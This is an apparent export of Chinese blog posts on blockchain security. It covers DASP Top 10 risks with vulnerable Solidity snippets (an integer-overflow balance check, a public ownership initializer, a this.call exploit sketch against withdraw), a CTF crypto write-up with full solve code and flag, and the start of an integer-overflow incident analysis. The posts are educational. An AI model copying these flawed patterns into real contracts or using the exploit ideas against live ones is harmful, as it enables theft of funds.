<p><img src="/2021/03/10/12/image-20210306222800930.png" alt="avatar"></p>
<h2 id="Solidity合约调用方式"><a href="#Solidity合约调用方式" class="headerlink" title="Solidity合约调用方式"></a>Solidity合约调用方式</h2><ul>
<li>call</li>
</ul>
<p>最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境</p>
<ul>
<li>delegetcall</li>
</ul>
<p>调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境</p>
<ul>
<li><p>callcode</p>
<p>调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境</p>
</li>
</ul>
<h2 id="DASP-TOP-10"><a href="#DASP-TOP-10" class="headerlink" title="DASP TOP 10"></a>DASP TOP 10</h2><h3 id="1-高级可持续威胁"><a href="#1-高级可持续威胁" class="headerlink" title="1.高级可持续威胁"></a>1.高级可持续威胁</h3><p>高级可持续威胁会导致区块链系统被入侵，权限被控制，最终导致资金被盗取，敏感数据被泄露等系列严重问题</p>
<p>事件：</p>
<ul>
<li>Mt.Gox 攻击公司内部人员电脑渗透进内网修改比特币价格进行交易</li>
<li>Coincheck 使用热钱包，且未实行多重签名系统</li>
<li>Fomo3D 基于BAPT (区块链高级持续威胁)，对区块链基础设施，智能合约进行攻击</li>
</ul>
<h3 id="2-失控的币值膨胀"><a href="#2-失控的币值膨胀" class="headerlink" title="2.失控的币值膨胀"></a>2.失控的币值膨胀</h3><p>铸币总数限制部分的程序设计和实现 有漏洞，则可能导致铸币总数失控，甚至超出设定发币总数多倍，致使币值失控通胀</p>
<ul>
<li>BEC  币值控制部分的代码 出现了整数溢出漏洞，导致出现无限铸币的情况</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(balances[_from] &lt; _fee + _value) 	revert();</span><br></pre></td></tr></table></figure>
<p>这段代码本意是检查账户余额是否大于转帐余额加上转账费用，但是这两个参数都可以由攻击者控制。当<code>_value</code> 的值足够大大于2^256-1时，会导致 <code>_value+_fee</code>发生整数上溢，使得 <code>_value+_fee的</code>值等于零，从而绕过检查，仍然支付成功，使得账户凭空获得大量数字货币</p>
<h3 id="3-失效的权限控制"><a href="#3-失效的权限控制" class="headerlink" title="3.失效的权限控制"></a>3.失效的权限控制</h3><p>由于权限控制在设计或编码过程中的疏忽和缺陷，导致本来应该限制使用范围的重 要函数或权限没有控制好范围，从而被攻击者调用这些重要函数或者使用权限实施攻击</p>
<ul>
<li>Parity 钱包  将下列初始化函数设置为public 导致其他合约也能调用，以至于钱包的所有者被修改</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initContract</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">	owner = msg.sender;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>编译器漏洞     编写构造函数过程中不注意也会导致越权调用</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">contract Owned &#123;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Owned</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">//solidity &lt;=^0.4.22</span></span><br><span class="line">contract Owned &#123;</span><br><span class="line"> <span class="title">constructor</span>(<span class="params"></span>) <span class="title">public</span> &#123;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">//solidity &gt;=^0.4.22</span></span><br></pre></td></tr></table></figure>
<p>导致构造函数被初始化成普通函数，可以被任意人调用，容易导致owner权限被盗取</p>
<p><a href>https://paper.seebug.org/741/</a></p>
<ul>
<li>Call调用限制</li>
</ul>
<p>call是最常用的调用方式，调用后内置变量msg的值会被修改为调用者，但执行环境是被调用者的运行环境，如果合约中有函数以 msg.sender 作为关键变量的代码逻辑，比如向 msg.sender 转账，那么就会导致越权操作。</p>
<p>先来看两个函数</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">address addr</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line"> <span class="built_in">require</span>(isAuth(msg.sender));</span><br><span class="line">addr.transfer(<span class="built_in">this</span>.balance);</span><br><span class="line">&#125;<span class="comment">//合约拥有者或合约本身拥有取款操作</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAuth</span>(<span class="params">address src</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (src == address(<span class="built_in">this</span>)) &#123; <span class="comment">//检查是否合约拥有者或合约本身</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">if</span> (src == owner) &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发起恶意怕拼接请求</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callFunc</span>(<span class="params">bytes data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line"> <span class="built_in">this</span>.call(data);</span><br><span class="line"> <span class="comment">//this.call(bytes4(keccak256(&quot;withdraw(address)&quot;)), target); //利用代码示意</span></span><br><span class="line"> <span class="comment">//后面会总结一篇三种交互方式的安全问题</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-不安全的共识协议"><a href="#4-不安全的共识协议" class="headerlink" title="4.不安全的共识协议"></a>4.不安全的共识协议</h3><p>共识协议由于存在某些设计之初未考虑到的漏洞，导致漏洞可能被攻击者识别和利 用，从而损害链上参与者的利益</p>
<ul>
<li>Krypton    遭遇51%攻击—回滚交易实现双花，DDOS攻击网络节点</li>
<li>ETC  51% 算力攻击双花交易，篡改后使得被替换的块的交易无法追溯</li>
</ul>
<h3 id="5-考虑不充分的程序逻辑"><a href="#5-考虑不充分的程序逻辑" class="headerlink" title="5.考虑不充分的程序逻辑"></a>5.考虑不充分的程序逻辑</h3><p>由于软件设计和编码的错误原因，存在没有考虑到的异常分支，导致程序逻辑可以 被攻击者利用，以至于陷入设计者未预期的流程，造成重大损失</p>
<ul>
<li>The DAO  </li>
</ul>
<p><a href>https://blog.csdn.net/u011721501/article/details/79450122</a></p>
<h3 id="6-不严谨的业务策略"><a href="#6-不严谨的业务策略" class="headerlink" title="6.不严谨的业务策略"></a>6.不严谨的业务策略</h3><p>目前比较突出的一种业务策略类问题是利用高额的以太费用和技术手段让以太坊 堵塞，从而获得游戏中的大奖。但根据场景不一样，会有许多不一样的业务问题，这些 也都会对产品的公平性，乃至产品的生存造成重大影响，需要特别注意！</p>
<ul>
<li>FOMO3D</li>
</ul>
<p>类似于竞拍中自己出价后，使用技术手段使得以太坊拥堵，使得其他玩家无法出价，获得最后的胜利！</p>
<p>​    实现方法</p>
<ol>
<li>和矿主合谋，让矿主在我的交易后，不再打包其他购买KEY的交易，可能性几乎为零</li>
<li>在自己成功购买KEY之后，把以太坊堵塞，让其无法打包其他购买KEY的交易。</li>
</ol>
<p><a href>https://mp.weixin.qq.com/s/s_RCF_EDlptQpm3d7mzApA</a></p>
<h3 id="7-校验不严格的交易逻辑"><a href="#7-校验不严格的交易逻辑" class="headerlink" title="7.校验不严格的交易逻辑"></a>7.校验不严格的交易逻辑</h3><p>交易的校验逻辑不够严密，以致攻击者可以构造假的交易行为，但却被校验方验证 通过，误认为真的交易行为。或者提交了真的交易操作，但是通过时间差，黑名单等因 素，让交易操作产生回滚来实现，实际上的交易动作并没有完成，而商家仅验证是否有 交易行为的话，就可能导致资金上的损失。</p>
<ul>
<li>EOSBET</li>
<li>回滚类攻击      利用时间差</li>
<li>BetDice      黑名单</li>
</ul>
<h3 id="8-脆弱的随机数机制"><a href="#8-脆弱的随机数机制" class="headerlink" title="8.脆弱的随机数机制"></a>8.脆弱的随机数机制</h3><p>这里指的不仅仅是伪随机函数的问题，而是整个随机数生成机制不够安全，导致可 以被攻击者提前获取或猜测到随机数的结果，以实施攻击。</p>
<h3 id="9-存在缺陷的激励机制"><a href="#9-存在缺陷的激励机制" class="headerlink" title="9.存在缺陷的激励机制"></a>9.存在缺陷的激励机制</h3><p>激励机制是区块链的重要环节，但若开发者设计的激励机制存在可以被利用的漏洞， 就可能会给开发者或用户带来损失。</p>
<ul>
<li>Eligius 矿池     块代扣攻击 挖出不上交</li>
</ul>
<h3 id="10-日志记录和监控不足"><a href="#10-日志记录和监控不足" class="headerlink" title="10.日志记录和监控不足"></a>10.日志记录和监控不足</h3><p>日志记录和监控的问题对区块链团队和公司来说非常很重要。如果没有足够的日志 记录和监控，被攻击的过程中，你会不知道，不能及时止损。发生安全事件后，你没有 办法调查，也没有办法改进以避免再犯同样的错误。所以日志记录和监控不足的问题也 很严重！</p>
<ul>
<li>未知的攻击手法无法追溯主要是没有完善的日志记录和监控</li>
</ul>
]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>2020 CISCN Crypto lockrise</title>
    <url>/2021/01/19/10/</url>
    <content><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">sbox=list(range(256))</span></span><br><span class="line"><span class="string">random.shuffle(sbox)</span></span><br><span class="line"><span class="string">print(sbox)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">sbox = [<span class="number">217</span>, <span class="number">25</span>, <span class="number">248</span>, <span class="number">51</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">32</span>, <span class="number">69</span>, <span class="number">96</span>, <span class="number">117</span>, <span class="number">86</span>, <span class="number">108</span>, <span class="number">155</span>, <span class="number">50</span>, <span class="number">27</span>, <span class="number">249</span>, <span class="number">171</span>, <span class="number">82</span>, <span class="number">168</span>, <span class="number">245</span>, <span class="number">228</span>, <span class="number">195</span>, <span class="number">118</span>, <span class="number">187</span>, <span class="number">12</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">241</span>,</span><br><span class="line"><span class="number">26</span>, <span class="number">41</span>, <span class="number">194</span>, <span class="number">205</span>, <span class="number">236</span>, <span class="number">185</span>, <span class="number">73</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">175</span>, <span class="number">44</span>, <span class="number">116</span>, <span class="number">48</span>, <span class="number">148</span>, <span class="number">22</span>, <span class="number">142</span>, <span class="number">190</span>, <span class="number">114</span>, <span class="number">201</span>, <span class="number">60</span>, <span class="number">59</span>, <span class="number">89</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">198</span>, <span class="number">191</span>, <span class="number">93</span>, <span class="number">152</span>, <span class="number">230</span>, <span class="number">34</span>, <span class="number">124</span>, <span class="number">173</span>, <span class="number">146</span>, <span class="number">226</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">165</span>, <span class="number">83</span>, <span class="number">212</span>, <span class="number">206</span>, <span class="number">229</span>, <span class="number">16</span>, <span class="number">95</span>, <span class="number">56</span>, <span class="number">107</span>, <span class="number">144</span>, <span class="number">250</span>, <span class="number">149</span>, <span class="number">153</span>, <span class="number">208</span>, <span class="number">133</span>, <span class="number">145</span>, <span class="number">156</span>, <span class="number">172</span>, <span class="number">162</span>, <span class="number">113</span>, <span class="number">100</span>, <span class="number">183</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">223</span>, <span class="number">130</span>, <span class="number">72</span>, <span class="number">135</span>, <span class="number">84</span>, <span class="number">147</span>, <span class="number">15</span>, <span class="number">242</span>, <span class="number">177</span>, <span class="number">42</span>, <span class="number">23</span>, <span class="number">122</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">131</span>, <span class="number">166</span>, <span class="number">244</span>, </span><br><span class="line"><span class="number">88</span>, <span class="number">231</span>, <span class="number">94</span>, <span class="number">235</span>, <span class="number">29</span>, <span class="number">125</span>, <span class="number">7</span>, <span class="number">232</span>, <span class="number">110</span>, <span class="number">90</span>, <span class="number">179</span>, <span class="number">75</span>, <span class="number">220</span>, <span class="number">71</span>, <span class="number">251</span>, <span class="number">45</span>, <span class="number">243</span>, <span class="number">207</span>, <span class="number">58</span>, <span class="number">120</span>, <span class="number">184</span>, <span class="number">9</span>, <span class="number">39</span>, <span class="number">218</span>, <span class="number">63</span>, <span class="number">38</span>, <span class="number">254</span>, <span class="number">167</span>, <span class="number">140</span>, <span class="number">53</span>, <span class="number">213</span>, <span class="number">214</span>, <span class="number">80</span>, <span class="number">85</span>, <span class="number">128</span>, <span class="number">8</span>, <span class="number">64</span>, <span class="number">174</span>, <span class="number">132</span>, <span class="number">233</span>, <span class="number">65</span>, <span class="number">200</span>, <span class="number">36</span>, <span class="number">115</span>, <span class="number">215</span>, <span class="number">192</span>, <span class="number">74</span>, <span class="number">203</span>, <span class="number">11</span>, <span class="number">134</span>, <span class="number">104</span>, <span class="number">170</span>, <span class="number">160</span>, <span class="number">227</span>, <span class="number">169</span>, <span class="number">246</span>, <span class="number">141</span>, <span class="number">221</span>, <span class="number">52</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">47</span>, <span class="number">199</span>, <span class="number">33</span>, <span class="number">216</span>, <span class="number">182</span>, <span class="number">188</span>, <span class="number">143</span>, <span class="number">138</span>, <span class="number">102</span>, <span class="number">202</span>, <span class="number">105</span>, <span class="number">79</span>, <span class="number">49</span>, <span class="number">253</span>, <span class="number">30</span>, <span class="number">121</span>, <span class="number">103</span>, <span class="number">137</span>, <span class="number">1</span>, <span class="number">211</span>, <span class="number">150</span>, <span class="number">5</span>, <span class="number">55</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">240</span>, <span class="number">178</span>, <span class="number">159</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">224</span>, <span class="number">210</span>, <span class="number">67</span>, <span class="number">157</span>, <span class="number">91</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">186</span>, <span class="number">126</span>, <span class="number">237</span>, <span class="number">98</span>, <span class="number">252</span>, <span class="number">2</span>, <span class="number">239</span>, <span class="number">43</span>, <span class="number">180</span>, <span class="number">209</span>, <span class="number">238</span>, <span class="number">225</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">66</span>, <span class="number">46</span>, <span class="number">61</span>, <span class="number">17</span>, <span class="number">31</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">158</span>, <span class="number">189</span>, <span class="number">234</span>, <span class="number">193</span>, <span class="number">111</span>, <span class="number">204</span>, <span class="number">19</span>, <span class="number">77</span>, <span class="number">222</span>, <span class="number">164</span>, <span class="number">14</span>, <span class="number">97</span>, <span class="number">3</span>, <span class="number">70</span>, <span class="number">255</span>, <span class="number">78</span>, <span class="number">129</span>, <span class="number">163</span>, <span class="number">92</span>, <span class="number">76</span>, <span class="number">4</span>, <span class="number">123</span>, <span class="number">176</span>, <span class="number">106</span>, <span class="number">161</span>, <span class="number">154</span>, <span class="number">136</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lock</span>(<span class="params">m</span>):</span></span><br><span class="line">    r=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r.append(sbox[i])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">peak</span>(<span class="params">m</span>):</span></span><br><span class="line">    r=m[-<span class="number">1</span>:]+m[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rise</span>(<span class="params">m,k</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m)==<span class="built_in">len</span>(k)</span><br><span class="line">    r=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        r.append(m[i]^k[i])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">secret=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]</span><br><span class="line">r=lock(secret)</span><br><span class="line"><span class="comment">#[25, 248, 51, 6, 37, 32, 69, 96]</span></span><br><span class="line">r=peak(r)</span><br><span class="line"><span class="comment">#[96, 25, 248, 51, 6, 37, 32, 69]</span></span><br><span class="line">r=rise(r,key)</span><br><span class="line"></span><br><span class="line">r=lock(r)</span><br><span class="line">r=peak(r)</span><br><span class="line">r=rise(r,key)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;lockrise:&quot;</span>,r)</span><br><span class="line">print(<span class="string">&quot;k0 ^ k7:&quot;</span>,key[<span class="number">0</span>]^key[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">secret=os.urandom(<span class="number">8</span>)</span><br><span class="line">r=lock(secret)</span><br><span class="line">r=peak(r)</span><br><span class="line">r=rise(r,key)</span><br><span class="line"></span><br><span class="line">r=lock(r)</span><br><span class="line">r=peak(r)</span><br><span class="line">r=rise(r,key)</span><br><span class="line">print(<span class="string">&quot;encrypted:&quot;</span>,r)</span><br><span class="line">d=DES.new(secret,DES.MODE_ECB)</span><br><span class="line">flag=<span class="string">b&quot;flagxxxxx...xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">print(d.encrypt(flag).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>
<p>​    拿到题目看有flag的地方判断是DES加密（ECB模式）</p>
<p>​    所以想拿到flag，需要进行解密。对称加密，密文已知，则需要知道密钥secret，就能解出flag。</p>
<p>​    分析一下题目的函数</p>
<ul>
<li><p>lock(m): 取s-box[i], i属于m</p>
</li>
<li><p>peak(m): 对m进行循环右移</p>
</li>
<li><p>rise(m,key): 对m,key进行异或操作，m[i]^key[i]</p>
<p>看一下可以利用的信息,关键点k0 ^ k7 = 160, 有256种可能</p>
<p>同时加密过程</p>
<p>r[6]=secret[6] -&gt; sbox[r[6]] -&gt; r[7] -&gt;  r[7] ^ k[7] -&gt; sbox[r[7] ^ k[7] -&gt; r[0] -&gt;r[0] ^ k[0] -&gt; r[0]                    -&gt;lockrise[0]</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k7 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    k0 = <span class="number">160</span> ^ k7</span><br><span class="line">    <span class="keyword">if</span> sbox[r[<span class="number">7</span>] ^ k7] ^ k0 == lockrise[<span class="number">0</span>]:</span><br><span class="line">        print(k0, k7)</span><br><span class="line">        <span class="comment"># 0 160</span></span><br></pre></td></tr></table></figure>
<p>  所以k[0]和k[7]的值分别为0 160</p>
<p>  因为</p>
  <figure class="highlight inform7"><table><tr><td class="code"><pre><span class="line">sbox<span class="comment">[r<span class="comment">[i]</span> ^ key<span class="comment">[i]</span>]</span> ^ key<span class="comment">[i+1]</span> == lockrise<span class="comment">[i + 1]</span></span><br></pre></td></tr></table></figure>
<p>  知道r[0]可以循环求解</p>
  <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> sbox[r[i] ^ key[i]] ^ k == lockrise[i + <span class="number">1</span>]:</span><br><span class="line">            print(i, k)</span><br><span class="line">            key.append(k)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br><span class="line"><span class="comment"># [0, 180, 224, 60, 139, 193, 154, 160]</span></span><br></pre></td></tr></table></figure>
<p>  再根据第二次的r和key反过来求解secret,将所有函数和次序反过来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_rise</span>(<span class="params">m, k</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) == <span class="built_in">len</span>(k)</span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        r.append(m[i] ^ k[i])</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_peak</span>(<span class="params">m</span>):</span></span><br><span class="line">    r = m[<span class="number">1</span>:] + m[<span class="number">0</span>:<span class="number">1</span>]  <span class="comment"># left shift</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_lock</span>(<span class="params">m</span>):</span></span><br><span class="line">    r = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        r.append(sbox.index(i))</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encrypted = [<span class="number">32</span>, <span class="number">98</span>, <span class="number">40</span>, <span class="number">152</span>, <span class="number">125</span>, <span class="number">149</span>, <span class="number">87</span>, <span class="number">167</span>]</span><br><span class="line">x = inv_rise(encrypted, key)</span><br><span class="line">x = inv_peak(x)</span><br><span class="line">x = inv_lock(x)</span><br><span class="line">x = inv_rise(x, key)</span><br><span class="line">x = inv_peak(x)</span><br><span class="line">x = inv_lock(x)</span><br><span class="line">print(x)</span><br><span class="line"><span class="comment"># [35, 239, 81, 231, 237, 218, 108, 166]</span></span><br></pre></td></tr></table></figure>
<p>得到secret的值为[35, 239, 81, 231, 237, 218, 108, 166]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line">secret = [<span class="number">35</span>, <span class="number">239</span>, <span class="number">81</span>, <span class="number">231</span>, <span class="number">237</span>, <span class="number">218</span>, <span class="number">108</span>, <span class="number">166</span>]</span><br><span class="line">flag = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0304eb66ffd8a1e1ee60b7e923c7823da10bb23fba254ab6748137b204133e2a35759572068c3a0c&quot;</span>)</span><br><span class="line"></span><br><span class="line">d = DES.new(<span class="built_in">bytes</span>(secret), DES.MODE_ECB)</span><br><span class="line">print(d.decrypt(flag))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;lock_peak_rise_repeat_2333_7481233&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
        <tag>Des</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链整数溢出漏洞</title>
    <url>/2021/06/07/15/</url>
    <content><![CDATA[<p>文章首发于-<a href="https://xz.aliyun.com/t/9693">区块链整数溢出漏洞 - 先知社区 (aliyun.com)</a></p>
<h1 id="0x01-溢出攻击事件"><a href="#0x01-溢出攻击事件" class="headerlink" title="0x01 溢出攻击事件"></a>0x01 溢出攻击事件</h1><p>2018年4月22日，黑客对BEC智能合约发起攻击，凭空取出</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">57</span>,<span class="number">896</span>,<span class="number">044</span>,<span class="number">618</span>,<span class="number">658</span>,<span class="number">100</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>.<span class="number">792003956564819968</span></span><br></pre></td></tr></table></figure>
<p>个BEC代币并在市场上进行抛售，BEC随即急剧贬值，价值几乎为0，该市场瞬间土崩瓦解。</p>
<p>2018年4月25日，SMT项目方发现其交易存在异常，黑客利用其函数漏洞创造了</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">65</span>,<span class="number">133</span>,<span class="number">050</span>,<span class="number">195</span>,<span class="number">990</span>,<span class="number">400</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span> + <span class="number">50</span>,<span class="number">659</span>,<span class="number">039</span>,<span class="number">041</span>,<span class="number">325</span>,<span class="number">800</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span>,<span class="number">000</span></span><br></pre></td></tr></table></figure>
<p>的SMT币，火币Pro随即暂停了所有币种的充值提取业务。</p>
<p>2018年12月27日，以太坊智能合约Fountain(FNT)出现整数溢出漏洞，黑客利用其函数漏洞创造了</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">2 </span>+ <span class="number">115792089237316195423570985008687907853269984665640564039457584007913129639935</span></span><br></pre></td></tr></table></figure>
<p>的SMT币</p>
<h1 id="0x02-漏洞简介"><a href="#0x02-漏洞简介" class="headerlink" title="0x02 漏洞简介"></a>0x02 漏洞简介</h1><p>在编程语言里面，因为算术运算导致的整数溢出漏洞屡见不鲜</p>
<ul>
<li><p><a href="https://zhuanlan.zhihu.com/p/28563004">C语言的整数溢出机制</a></p>
</li>
<li><p><a href="https://mp.weixin.qq.com/s/j-WbrCQVb4E2JfY-bDqzJw">CVE-2020-16040: Chromium V8引擎整数溢出漏洞分析</a></p>
</li>
<li><a href="https://blog.csdn.net/Blue_Starry_sky/article/details/113035140">http.sys整数溢出漏洞（MS15-034）验证方法</a></li>
</ul>
<p>在solidity语言中，变量支持的类型从uint8-uint256，int8-int256。每一个整型变量只能存储固定大小数值范围内的数。uint表示无符号数。比如uint8只能储存0-&gt;2^8-1范围内的数字。当一个uint8类型的变量值为255时，在进行加一，就会发生进位，导致整体翻转为零。</p>
<p>简单来说，就是Solidity整形变量被赋值高于或者低于可以表示的范围时 值会发生改变 一般会溢出为2的uint类型次方 -1 或者 0</p>
<ul>
<li>上溢：会溢出为0</li>
<li>下溢：会溢出为2^n-1</li>
</ul>
<p>根据运算形式又可以分为</p>
<ul>
<li>加法溢出</li>
<li>乘法溢出</li>
<li>减法溢出</li>
</ul>
<h1 id="0x03-简单演示"><a href="#0x03-简单演示" class="headerlink" title="0x03 简单演示"></a>0x03 简单演示</h1><h2 id="0x01加法溢出"><a href="#0x01加法溢出" class="headerlink" title="0x01加法溢出"></a>0x01加法溢出</h2><p><img src="/2021/06/07/15/image-20210603100447649.png?lastModify=1622685978" alt="image-20210603100447649"></p>
<p>在本地JavaScript VM 部署之后可以查看max与_overflow的值</p>
<p><img src="/2021/06/07/15/image-20210603100620820.png" alt="image-20210603100620820"></p>
<p>如果uint8 类型的变量达到了它的最大值(2^8 - 1)，如果在加上一个大于0的值便会变成0</p>
<p>可以看到max+1=256.超出了uint8能表示的范围，导致发生了加法上溢。</p>
<h2 id="0x02乘法溢出"><a href="#0x02乘法溢出" class="headerlink" title="0x02乘法溢出"></a>0x02乘法溢出</h2><p><img src="/2021/06/07/15/image-20210603100958538.png" alt="image-20210603100958538"></p>
<p>在本地JavaScript VM 部署之后可以查看max与_overflow的值</p>
<p><img src="/2021/06/07/15/image-20210603101023798.png" alt="image-20210603101023798"></p>
<p>如果uint8 类型的变量超过了它的最大值(2^8 - 1)，最后它的值就会回绕变成0</p>
<p>可以看到max*2=256.超出了uint8能表示的范围，导致发生了乘法上溢。</p>
<h2 id="0x03减法溢出"><a href="#0x03减法溢出" class="headerlink" title="0x03减法溢出"></a>0x03减法溢出</h2><p><img src="/2021/06/07/15/image-20210603101142269.png" alt="image-20210603101142269"></p>
<p>在本地JavaScript VM 部署之后可以查看min与_overflow的值</p>
<p><img src="/2021/06/07/15/image-20210603101205935.png" alt="image-20210603101205935"></p>
<p>如果uint8 类型的变量达到了它的最小值(0)，如果在减去一个大于0的值便会变成2^8-1(uin8类型的最大值)</p>
<p>可以看到min-1=-1.超出了uint8能表示的范围，导致发生了减法下溢。</p>
<h1 id="0x04-案例分析"><a href="#0x04-案例分析" class="headerlink" title="0x04 案例分析"></a>0x04 案例分析</h1><p>下面将分别从三个案例分别分析加法，乘法，减法的整数溢出</p>
